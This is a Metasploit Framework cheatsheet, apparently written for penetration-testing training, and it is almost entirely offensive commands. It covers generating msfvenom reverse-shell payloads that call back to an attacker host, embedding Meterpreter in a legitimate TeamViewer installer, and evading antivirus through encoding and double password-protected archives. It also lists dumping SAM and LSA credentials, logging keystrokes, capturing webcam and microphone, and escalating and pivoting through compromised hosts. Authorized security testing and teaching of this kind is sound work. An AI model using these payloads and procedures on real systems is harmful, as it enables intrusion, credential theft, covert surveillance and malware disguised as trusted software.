# Using the Metasploit Framework Cheatsheet

## Core Philosophy
Metasploit is a support tool, not a backbone. A failed module does not disprove a vulnerability; it proves the module needs customization. Know the tool inside out, read its code, and avoid tunnel vision. The framework saves time for the more complex parts of an assessment, not a replacement for manual skills.

---

## MSF Architecture
```
/usr/share/metasploit-framework/
├── modules/        # exploits, auxiliary, payloads, post, encoders, nops, evasion
├── plugins/        # third-party plugin integrations (.rb files)
├── scripts/        # meterpreter, shell, resource scripts
└── tools/          # standalone CLI utilities
```

---

## Launching msfconsole
```bash
sudo msfconsole          # full launch with banner
sudo msfconsole -q       # quiet, no banner
sudo msfdb run           # launch with PostgreSQL DB connected
sudo apt update && sudo apt install metasploit-framework   # update MSF
```

---

## MSF Engagement Structure
Enumeration → Preparation → Exploitation → Privilege Escalation → Post-Exploitation

---

## Module Types and Syntax
```
<No.> <type>/<os>/<service>/<name>
# Example: 794 exploit/windows/ftp/scriptftp_list
```

| Type | Description |
|---|---|
| auxiliary | Scanning, fuzzing, sniffing, admin capabilities |
| encoders | Ensure payloads are intact to their destination |
| exploits | Exploit a vulnerability to deliver a payload |
| nops | Keep payload sizes consistent across attempts |
| payloads | Code that runs remotely and calls back to attacker |
| post | Post-exploitation: gather info, pivot, escalate |
| evasion | AV/IDS evasion modules |

---

## Search and Select Modules
```bash
# Search by keyword, CVE, type, platform, rank
search eternalromance
search type:exploit platform:windows cve:2021 rank:excellent microsoft
search ms17_010
search nagios

# Select a module
use <index number>
use exploit/windows/smb/ms17_010_psexec

# Module info
info

# Show targets for a module
show targets
set target <index>
```

---

## Configure and Run Modules
```bash
options                       # show current options
show options                  # same as above
set RHOSTS 10.10.10.40        # set target IP
set LHOST 10.10.14.15         # set attacker IP
set LPORT 4444                # set listener port
set SHARE ADMIN$              # set SMB share
set SMBUser administrator
set SMBPass <password>
setg RHOSTS 10.10.10.40       # set globally (persists across modules)
setg LHOST tun0               # can use interface name

run                           # launch the exploit
exploit                       # alias for run
exploit -j                    # run as background job
check                         # check if target is vulnerable (if supported)
```

---

## Payloads

### Payload types
| Type | Description |
|---|---|
| Singles | Self-contained, no stage, everything in one payload |
| Stagers | Small payload that establishes connection, pulls stage down |
| Stages | Full-featured payload (Meterpreter, VNC, shell) sent after stager |

### Staged vs stageless naming convention
- Staged: `windows/meterpreter/reverse_tcp` (slash between shell and transport)
- Stageless: `windows/meterpreter_reverse_tcp` (no slash, all in one)

### List and search payloads
```bash
show payloads                                  # list all compatible payloads
grep meterpreter show payloads                 # filter by keyword
grep meterpreter grep reverse_tcp show payloads  # chain grep filters
grep -c meterpreter show payloads              # count matches
set payload <index>                            # select payload by index
set payload windows/x64/meterpreter/reverse_tcp
```

### Common Windows payloads
| Payload | Description |
|---|---|
| windows/x64/meterpreter/reverse_tcp | Staged Meterpreter reverse TCP (x64) |
| windows/x64/meterpreter_reverse_tcp | Stageless Meterpreter reverse TCP (x64) |
| windows/x64/shell/reverse_tcp | Staged raw shell reverse TCP |
| windows/x64/shell_reverse_tcp | Stageless raw shell reverse TCP |
| windows/x64/powershell/reverse_tcp | Interactive PowerShell reverse TCP |

---

## Targets
```bash
show targets             # list available targets for current module
set target <Id>          # select a specific target
```
Leaving target on `Automatic` lets MSF detect the target version itself.

---

## Encoders
```bash
show encoders            # list compatible encoders for current module + payload

# msfvenom with encoding
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 \
  -o /tmp/payload.exe

# Embed payload into legitimate executable (-k keeps original behavior)
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
  -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai \
  -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```
SGN (Shikata Ga Nai) was historically powerful but is now widely detected. Multiple iterations help but do not guarantee AV bypass. Use alongside other techniques (packers, archives, process injection).

---

## MSFvenom (Standalone Payload Generator)
```bash
# List all payloads
msfvenom -l payloads

# Linux ELF reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf > shell.elf

# Windows EXE Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=<IP> LPORT=443 -f raw > shell.php

# ASPX reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=1337 -f aspx > shell.aspx

# Remove bad characters
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=443 -b "\x00" -f perl

# Encode with iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 \
  -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe

# Check with VirusTotal
msf-virustotal -k <API key> -f payload.exe
```

---

## multi/handler (Catch Reverse Shells)
```bash
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
run -j             # run as job to keep listening for multiple sessions
```

---

## Meterpreter Commands
```bash
# Core
help / ?           # show all available commands
background / bg    # background current session
sessions -l        # list all sessions
sessions -i 1      # interact with session 1
exit / quit        # terminate session

# System info
getuid             # current user
getsid             # user SID
sysinfo            # OS, hostname, architecture
getpid             # current process ID
ps                 # list all running processes
migrate <PID>      # migrate to another process
steal_token <PID>  # steal impersonation token from a process
getprivs           # show available privileges

# File system
ls / dir           # list files
cd                 # change directory
pwd / getwd        # print working directory
cat <file>         # read file contents
download <file>    # download file from target
upload <file>      # upload file to target
search -f *.txt    # search for files

# Networking
ifconfig / ipconfig   # list network interfaces
netstat               # active connections
portfwd add -l 3389 -p 3389 -r <target>  # port forward

# Privilege escalation
getsystem          # attempt to elevate to SYSTEM

# Credential dumping (requires SYSTEM)
hashdump           # dump SAM hashes
lsa_dump_sam       # dump SAM database
lsa_dump_secrets   # dump LSA secrets

# Shell
shell              # drop into system shell (cmd.exe / bash)

# Post-exploitation utilities
keyscan_start      # start keystroke capture
keyscan_dump       # dump captured keystrokes
keyscan_stop       # stop keystroke capture
screenshot         # capture desktop screenshot
webcam_snap        # take webcam photo
record_mic         # record microphone

# Pivoting
run post/multi/manage/autoroute   # add route through session
```

---

## Sessions and Jobs
```bash
# Sessions
sessions              # list active sessions
sessions -l           # verbose list
sessions -i <id>      # interact with session
sessions -k <id>      # kill session
[Ctrl] + [Z]          # background current session

# Jobs
jobs -l               # list running jobs
jobs -k <id>          # kill a job
jobs -K               # kill all jobs
exploit -j            # run exploit as background job
```

---

## PostgreSQL Database Setup
```bash
sudo service postgresql start
sudo msfdb init
sudo msfdb status
sudo msfdb run        # start msfconsole with DB connected
```
Inside msfconsole:
```bash
db_status             # confirm DB connection
workspace             # list workspaces
workspace -a Target_1 # create new workspace
workspace Target_1    # switch to workspace
```

---

## Database Commands Inside msfconsole
```bash
db_nmap -sV -sS 10.10.10.8        # run Nmap and auto-store results
db_import Target.xml               # import Nmap XML output
db_export -f xml backup.xml        # export workspace data

hosts                              # list discovered hosts
hosts -R                           # set RHOSTS from hosts table
services                           # list discovered services
services -p 445                    # filter by port
creds                              # list gathered credentials
loot                               # list stored loot (hashes, secrets)
vulns                              # list stored vulnerabilities
```

---

## Post-Exploitation Modules
```bash
# Local exploit suggester (run against an existing session)
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# Common post modules
use post/windows/gather/hashdump
use post/windows/gather/credentials/credential_collector
use post/multi/gather/env
use post/multi/manage/shell_to_meterpreter
```

---

## Plugins
```bash
# Load a plugin
load nessus
load pentest

# List available plugins
ls /usr/share/metasploit-framework/plugins/

# Install a custom plugin
sudo cp plugin.rb /usr/share/metasploit-framework/plugins/
```
Popular plugins: Nessus, NexPose, Mimikatz (now Kiwi), Sqlmap, Openvas, WMAP.

```bash
# Load Kiwi (replaces old Mimikatz)
load kiwi
creds_all       # dump all creds
lsa_dump_sam
lsa_dump_secrets
```

---

## Writing and Importing Custom Modules
```bash
# Search ExploitDB for MSF-tagged modules
searchsploit nagios3
searchsploit -t Nagios3 --exclude=".py"

# Copy downloaded module to MSF
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb

# Reload modules inside msfconsole
reload_all

# Load at launch with custom path
msfconsole -m /usr/share/metasploit-framework/modules/
```
Naming rules: use snake_case, alphanumeric and underscores only. No dashes.

---

## AV/IDS Evasion Techniques

### Encoding (limited effectiveness against modern AV)
```bash
msfvenom -p <payload> -e x86/shikata_ga_nai -i 10 -f exe -o payload.exe
```

### Inject into legitimate executable
```bash
msfvenom -p <payload> LHOST=<IP> LPORT=<PORT> -k -x legit_app.exe \
  -e x86/shikata_ga_nai -a x86 --platform windows -o backdoor.exe -i 5
```

### Archive + password (bypasses many AV scanners)
```bash
rar a payload.rar -p payload.js    # password-protect archive
mv payload.rar payload             # remove extension
rar a payload2.rar -p payload      # double-archive
mv payload2.rar payload2           # remove extension again
```
Double-archiving with passwords + extension removal brought detection from 11/59 to 0/49 in the module example.

### MSF6 AV evasion improvements
- All Meterpreter sessions use AES encryption end-to-end.
- Windows shellcode generation uses a polymorphic randomization routine.
- DLLs resolve functions by ordinal instead of name.
- ReflectiveLoader export no longer present as text in binaries.

---

## Walkthrough Pattern (Full Engagement Flow)
```bash
# 1. Enumerate
db_nmap -sV -sS -p- <target_IP>
hosts
services

# 2. Find exploit
search <service/CVE/keyword>
use <module>
info

# 3. Configure
set RHOSTS <target>
set LHOST tun0
set payload windows/x64/meterpreter/reverse_tcp
show options

# 4. Exploit
run

# 5. Post-exploitation
getuid
sysinfo
hashdump
run post/multi/recon/local_exploit_suggester
# Use suggested local exploit to escalate
bg
use exploit/windows/local/<suggested>
set SESSION <id>
run

# 6. Persistence / pivoting
sessions -l
portfwd add -l 3389 -p 3389 -r <internal_IP>
run post/multi/manage/autoroute
```
